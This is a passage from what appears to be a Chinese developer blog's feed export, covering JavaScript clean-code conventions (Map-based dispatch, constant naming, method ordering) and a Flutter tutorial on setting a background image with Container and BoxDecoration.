按钮点击事件 * @param {number} status 活动状态：1 开团进行中 2 开团失败 3 商品售罄 4 开团成功 5 系统取消 */</span><span class="token keyword">const</span> onButtonClick <span class="token operator">=</span> <span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>  <span class="token keyword">let</span> action <span class="token operator">=</span> actions<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token operator">||</span> actions<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'default'</span><span class="token punctuation">)</span>  <span class="token function">sendLog</span><span class="token punctuation">(</span>action<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token function">jumpTo</span><span class="token punctuation">(</span>action<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样写用到了es6里的Map对象，是不是更爽了？Map对象和Object对象有什么区别呢？</p><ol><li>一个对象通常都有自己的原型，所以一个对象总有一个”prototype”键。</li><li>一个对象的键只能是字符串或者Symbols，但一个Map的键可以是任意值。</li><li>你可以通过size属性很容易地得到一个Map的键值对个数，而对象的键值对个数只能手动确认。</li></ol><h2 id="代码风格"><a href="#代码风格" class="headerlink" title="代码风格"></a>代码风格</h2><h3 id="常量大写"><a href="#常量大写" class="headerlink" title="常量大写"></a>常量大写</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//bad code</span><span class="token keyword">const</span> DAYS_IN_WEEK <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span><span class="token keyword">const</span> daysInMonth <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">;</span><span class="token keyword">const</span> songs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Back In Black'</span><span class="token punctuation">,</span> <span class="token string">'Stairway to Heaven'</span><span class="token punctuation">,</span> <span class="token string">'Hey Jude'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">const</span> Artists <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'ACDC'</span><span class="token punctuation">,</span> <span class="token string">'Led Zeppelin'</span><span class="token punctuation">,</span> <span class="token string">'The Beatles'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">eraseDatabase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">restore_database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">animal</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Alpaca</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//better code</span><span class="token keyword">const</span> DAYS_IN_WEEK <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span><span class="token keyword">const</span> DAYS_IN_MONTH <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">;</span><span class="token keyword">const</span> SONGS <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Back In Black'</span><span class="token punctuation">,</span> <span class="token string">'Stairway to Heaven'</span><span class="token punctuation">,</span> <span class="token string">'Hey Jude'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">const</span> ARTISTS <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'ACDC'</span><span class="token punctuation">,</span> <span class="token string">'Led Zeppelin'</span><span class="token punctuation">,</span> <span class="token string">'The Beatles'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">eraseDatabase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">restoreDatabase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Alpaca</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="先声明后调用"><a href="#先声明后调用" class="headerlink" title="先声明后调用"></a>先声明后调用</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//bad code</span><span class="token keyword">class</span> <span class="token class-name">PerformanceReview</span> <span class="token punctuation">{</span>  <span class="token function">constructor</span><span class="token punctuation">(</span>employee<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>employee <span class="token operator">=</span> employee<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">lookupPeers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> db<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>employee<span class="token punctuation">,</span> <span class="token string">'peers'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">lookupManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> db<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>employee<span class="token punctuation">,</span> <span class="token string">'manager'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">getPeerReviews</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> peers <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">lookupPeers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// ...</span>  <span class="token punctuation">}</span>  <span class="token function">perfReview</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPeerReviews</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getManagerReview</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getSelfReview</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">getManagerReview</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> manager <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">lookupManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">getSelfReview</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// ...</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">const</span> review <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PerformanceReview</span><span class="token punctuation">(</span>employee<span class="token punctuation">)</span><span class="token punctuation">;</span>review<span class="token punctuation">.</span><span class="token function">perfReview</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//better code</span><span class="token keyword">class</span> <span class="token class-name">PerformanceReview</span> <span class="token punctuation">{</span>  <span class="token function">constructor</span><span class="token punctuation">(</span>employee<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>employee <span class="token operator">=</span> employee<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">perfReview</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPeerReviews</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getManagerReview</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getSelfReview</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">getPeerReviews</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> peers <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">lookupPeers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// ...</span>  <span class="token punctuation">}</span>  <span class="token function">lookupPeers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> db<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>employee<span class="token punctuation">,</span> <span class="token string">'peers'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">getManagerReview</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> manager <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">lookupManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">lookupManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> db<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>employee<span class="token punctuation">,</span> <span class="token string">'manager'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">getSelfReview</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// ...</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">const</span> review <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PerformanceReview</span><span class="token punctuation">(</span>employee<span class="token punctuation">)</span><span class="token punctuation">;</span>review<span class="token punctuation">.</span><span class="token function">perfReview</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flutter设置背景图片</title>
      <link href="2019/09/19/flutterBg/"/>
      <url>2019/09/19/flutterBg/</url>
      
        <content type="html"><![CDATA[<h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><img src="https://img.58cdn.com.cn/escstatic/fecar/pmuse/blog/flutterbg.png" alt="flutterbg" style="zoom:50%;"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在我们平时的开发中会经常使用到背景图片，下面我这介绍的是Container通过BoxDecoration来设置的</p><h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><h3 id="1、创建路由子页面"><a href="#1、创建路由子页面" class="headerlink" title="1、创建路由子页面"></a>1、创建路由子页面</h3><pre class="line-numbers language-java"><code class="language-java">Widget <span class="token function">build</span><span class="token punctuation">(</span>BuildContext context<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">Scaffold</span><span class="token punctuation">(</span>      appBar<span class="token operator">:</span> <span class="token function">AppBar</span><span class="token punctuation">(</span>        title<span class="token operator">:</span> <span class="token function">Text</span><span class="token punctuation">(</span><span class="token string">"优选访客订阅功能"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token punctuation">)</span><span class="token punctuation">,</span>      body<span class="token operator">:</span> <span class="token function">buildBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Scaffold"><a href="#Scaffold" class="headerlink" title="Scaffold"></a>Scaffold</h4><p>路由页面的骨架，我们在里面可以拼装出一个完整的路由页面</p><h4 id="appBar"><a href="#appBar" class="headerlink" title="appBar"></a>appBar</h4><p>创建导航栏</p><h4 id="body"><a href="#body" class="headerlink" title="body"></a>body</h4><p>构建页面主体结构</p><h3 id="2、页面布局"><a href="#2、页面布局" class="headerlink" title="2、页面布局"></a>2、页面布局</h3><pre class="line-numbers language-java"><code class="language-java">Widget <span class="token function">buildBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Column</span><span class="token punctuation">(</span>      mainAxisAlignment<span class="token operator">:</span> MainAxisAlignment<span class="token punctuation">.</span>start<span class="token punctuation">,</span>      children<span class="token operator">:</span> <span class="token operator">&lt;</span>Widget<span class="token operator">></span><span class="token punctuation">[</span>        <span class="token function">buildHeader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// Row(children: &lt;Widget>[</span>        <span class="token comment" spellcheck="true">//   Text(</span>        <span class="token comment" spellcheck="true">//     '批量管理功能',</span>        <span class="token comment" spellcheck="true">//     style:TextStyle(</span>        <span class="token comment" spellcheck="true">//       fontSize: 16.0,</span>        <span class="token comment" spellcheck="true">//       color: Color.fromRGBO(234,200,134,1)</span>        <span class="token comment" spellcheck="true">//     )</span>        <span class="token comment" spellcheck="true">//   )</span>        <span class="token comment" spellcheck="true">// ],)</span>      <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为了后续方便维护，在页面布局时最好都拆分成不同的小模块来分开写，不然后期太难维护</p><h4 id="Column"><a href="#Column" class="headerlink" title="Column"></a>Column</h4><p>即指沿水平或垂直方向排布子组件。Flutter中通过<code>Row</code>和<code>Column</code>来实现线性布局;</p><p>首先布局思路就是使用<code>Column</code>可以在垂直方向排列其子组件。  </p><h4 id="mainAxisAlignment"><a href="#mainAxisAlignment" class="headerlink" title="mainAxisAlignment"></a>mainAxisAlignment</h4><p>然后在把里面的子元素都按主轴方向对齐</p><h3 id="3、背景设置"><a href="#3、背景设置" class="headerlink" title="3、背景设置"></a>3、背景设置</h3><pre class="line-numbers language-java"><code class="language-java">Widget <span class="token function">buildHeader</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Container</span><span class="token punctuation">(</span>      height<span class="token operator">:</span> <span class="token number">160.0</span><span class="token punctuation">,</span>      width<span class="token operator">:</span> MediaQuery<span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">.</span>size<span class="token punctuation">.</span>width<span class="token punctuation">,</span>      decoration<span class="token operator">:</span> <span class="token function">BoxDecoration</span><span class="token punctuation">(</span>        image<span class="token operator">:</span> <span class="token function">DecorationImage</span><span class="token punctuation">(</span>          image<span class="token operator">:</span> <span class="token function">AssetImage</span><span class="token punctuation">(</span><span class="token string">"images/header.png"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          fit<span class="token operator">:</span> BoxFit<span class="token punctuation">.</span>cover        <span class="token punctuation">)</span>      <span class="token punctuation">)</span><span class="token punctuation">,</span>      child<span class="token operator">:</span> <span class="token function">Column</span><span class="token punctuation">(</span>        mainAxisAlignment<span class="token operator">:</span> MainAxisAlignment<span class="token punctuation">.</span>center<span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// alignment: WrapAlignment.center,</span>        <span class="token comment" spellcheck="true">// crossAxisAlignment: WrapCrossAlignment.center,</span>        <span class="token comment" spellcheck="true">// runSpacing: 9.0,</span>        children<span class="token operator">:</span> <span class="token operator">&lt;</span>Widget<span class="token operator">></span><span class="token punctuation">[</span>          <span class="token function">Row</span><span class="token punctuation">(</span>            crossAxisAlignment<span class="token operator">:</span> CrossAxisAlignment<span class="token punctuation">.</span>center<span class="token punctuation">,</span>            mainAxisAlignment<span class="token operator">:</span> MainAxisAlignment<span class="token punctuation">.</span>center<span class="token punctuation">,</span>            children<span class="token operator">:</span> <span class="token operator">&lt;</span>Widget<span class="token operator">></span><span class="token punctuation">[</span>              <span class="token function">Text</span><span class="token punctuation">(</span>                <span class="token string">'批量管理功能'</span><span class="token punctuation">,</span>                style<span class="token operator">:</span><span class="token function">TextStyle</span><span class="token punctuation">(</span>                  fontSize<span class="token operator">:</span> <span class="token number">16.0</span><span class="token punctuation">,</span>                  color<span class="token operator">:</span> Color<span class="token punctuation">.</span><span class="token function">fromRGBO</span><span class="token punctuation">(</span><span class="token number">234</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">134</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token punctuation">)</span>              <span class="token punctuation">)</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>          <span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token function">Wrap</span><span class="token punctuation">(</span>            runSpacing<span class="token operator">:</span> <span class="token number">9.0</span><span class="token punctuation">,</span>            alignment<span class="token operator">:</span> WrapAlignment<span class="token punctuation">.</span>center<span class="token punctuation">,</span>            children<span class="token operator">:</span> <span class="token operator">&lt;</span>Widget<span class="token operator">></span><span class="token punctuation">[</span>              <span class="token function">Row</span><span class="token punctuation">(</span>                crossAxisAlignment<span class="token operator">:</span> CrossAxisAlignment<span class="token punctuation">.</span>center<span class="token punctuation">,</span>                mainAxisAlignment<span class="token operator">:</span> MainAxisAlignment<span class="token punctuation">.</span>center<span class="token punctuation">,</span>                children<span class="token operator">:</span> <span class="token operator">&lt;</span>Widget<span class="token operator">></span><span class="token punctuation">[</span>                  <span class="token function">Text</span><span class="token punctuation">(</span>                    <span class="token string">'${pageData['</span>title<span class="token string">']}'</span><span class="token punctuation">,</span>                    style<span class="token operator">:</span><span class="token function">TextStyle</span><span class="token punctuation">(</span>                      fontSize<span class="token operator">:</span> <span class="token number">38.0</span><span class="token punctuation">,</span>                      color<span class="token operator">:</span> Color<span class="token punctuation">.</span><span class="token function">fromRGBO</span><span class="token punctuation">(</span><span class="token number">234</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">134</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>                    <span class="token punctuation">)</span>                  <span class="token punctuation">)</span>                <span class="token punctuation">]</span><span class="token punctuation">,</span>              <span class="token punctuation">)</span><span class="token punctuation">,</span>              <span class="token comment" spellcheck="true">//自定义圆角</span>              <span class="token function">ClipRRect</span><span class="token punctuation">(</span>                borderRadius<span class="token operator">:</span> BorderRadius<span class="token punctuation">.</span><span class="token function">circular</span><span class="token punctuation">(</span><span class="token number">12.5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                child<span class="token operator">:</span> <span class="token function">Container</span><span class="token punctuation">(</span>                  height<span class="token operator">:</span> <span class="token number">25.0</span><span class="token punctuation">,</span>                  width<span class="token operator">:</span> <span class="token number">190.0</span><span class="token punctuation">,</span>                  color<span class="token operator">:</span> Color<span class="token punctuation">.</span><span class="token function">fromRGBO</span><span class="token punctuation">(</span><span class="token number">234</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">134</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                  child<span class="token operator">:</span> <span class="token function">Row</span><span class="token punctuation">(</span>                    crossAxisAlignment<span class="token operator">:</span> CrossAxisAlignment<span class="token punctuation">.</span>center<span class="token punctuation">,</span>                    mainAxisAlignment<span class="token operator">:</span> MainAxisAlignment<span class="token punctuation">.</span>center<span class="token punctuation">,</span>                    children<span class="token operator">:</span> <span class="token operator">&lt;</span>Widget<span class="token operator">></span><span class="token punctuation">[</span>                      <span class="token function">Text</span><span class="token punctuation">(</span>                        <span class="token string">'${pageData['</span>subTitle<span class="token string">']}'</span><span class="token punctuation">,</span>                         textAlign<span class="token operator">:</span> TextAlign<span class="token punctuation">.</span>center<span class="token punctuation">,</span>                        style<span class="token operator">:</span> <span class="token function">TextStyle</span><span class="token punctuation">(</span>color<span class="token operator">:</span> Color<span class="token punctuation">.</span><span class="token function">fromRGBO</span><span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                      <span class="token punctuation">)</span>                    <span class="token punctuation">]</span>                  <span class="token punctuation">)</span>                <span class="token punctuation">)</span>              <span class="token punctuation">)</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>          <span class="token punctuation">)</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先是把头部banner部分放在一个方法里面使用<code>Container</code>容器组件来包裹</p><h4 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h4><p>容器组件</p><blockquote><p>MediaQuery.of(context).size 获取屏幕的大小</p></blockquote><p>设置容器大小：</p><pre class="line-numbers language-js"><code class="language-js">height<span class="token punctuation">:</span> <span class="token number">160.0</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//高度自定义</span>width<span class="token punctuation">:</span> MediaQuery<span class="token punctuation">.</span><span class="token keyword">of</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">.</span>size<span class="token punctuation">.</span>width<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//宽度设置和屏幕等宽</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="decoration"><a href="#decoration" class="headerlink" title="decoration"></a>decoration</h5><pre class="line-numbers language-java"><code class="language-java">decoration<span class="token operator">:</span> <span class="token function">BoxDecoration</span><span class="token punctuation">(</span>    image<span class="token operator">:</span> <span class="token function">DecorationImage</span><span class="token punctuation">(</span>      image<span class="token operator">:</span> <span class="token function">AssetImage</span><span class="token punctuation">(</span><span class="token string">"images/header.png"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      fit<span class="token operator">:</span> BoxFit<span class="token punctuation">.</span>cover    <span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Container</code>组件的一个属性，用来装饰背景的；</p><p>我们通常会直接使用<code>BoxDecoration</code>类，它是一个Decoration的子类，实现了常用的装饰元素的绘制。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token function">BoxDecoration</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  Color color<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//颜色</span>  DecorationImage image<span class="token punctuation">,</span><span class="token comment" spellcheck="true">//图片</span>  BoxBorder border<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//边框</span>  BorderRadiusGeometry borderRadius<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//圆角</span>  List<span class="token operator">&lt;</span>BoxShadow<span class="token operator">></span> boxShadow<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//阴影,可以指定多个</span>  Gradient gradient<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//渐变</span>  BlendMode backgroundBlendMode<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//背景混合模式</span>  BoxShape shape <span class="token operator">=</span> BoxShape<span class="token punctuation">.</span>rectangle<span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//形状</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用DecorationImage方法来装载图片</p><pre class="line-numbers language-java"><code class="language-java">image<span class="token operator">:</span> <span class="token function">DecorationImage</span><span class="token punctuation">(</span>  image<span class="token operator">:</span> <span class="token function">AssetImage</span><span class="token punctuation">(</span><span class="token string">"images/header.png"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//加载本地图片</span>  fit<span class="token operator">:</span> BoxFit<span class="token punctuation">.</span>cover <span class="token comment" spellcheck="true">//图片伸缩方式</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="image图片配置"><a href="#image图片配置" class="headerlink" title="image图片配置"></a>image图片配置</h5><p>在<code>pubspec.yaml</code>中的<code>flutter</code>部分添加如下内容：</p><pre class="line-numbers language-js"><code class="language-js">assets<span class="token punctuation">:</span>    <span class="token operator">-</span> images<span class="token operator">/</span>header<span class="token punctuation">.</span>png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="Wrap流式布局"><a href="#Wrap流式布局" class="headerlink" title="Wrap流式布局"></a>Wrap流式布局</h4><pre class="line-numbers language-java"><code class="language-java"><span class="token function">Wrap</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>direction <span class="token operator">=</span> Axis<span class="token punctuation">.</span>horizontal<span class="token punctuation">,</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>alignment <span class="token operator">=</span> WrapAlignment<span class="token punctuation">.</span>start<span class="token punctuation">,</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>spacing <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">,</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>runAlignment <span class="token operator">=</span> WrapAlignment<span class="token punctuation">.</span>start<span class="token punctuation">,</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>runSpacing <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">,</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>crossAxisAlignment <span class="token operator">=</span> WrapCrossAlignment<span class="token punctuation">.</span>start<span class="token punctuation">,</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>textDirection<span class="token punctuation">,</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>verticalDirection <span class="token operator">=</span> VerticalDirection<span class="token punctuation">.</span>down<span class="token punctuation">,</span>  List<span class="token operator">&lt;</span>Widget<span class="token operator">></span> children <span class="token operator">=</span> <span class="token keyword">const</span> <span class="token operator">&lt;</span>Widget<span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>spacing</code>：主轴方向子widget的间距</li><li><code>runSpacing</code>：纵轴方向的间距</li><li><code>runAlignment</code>：纵轴方向的对齐方式</li></ul><h4 id="ClipRRect"><a href="#ClipRRect" class="headerlink" title="ClipRRect"></a>ClipRRect</h4><p>将子组件剪裁为圆角矩形</p><pre class="line-numbers 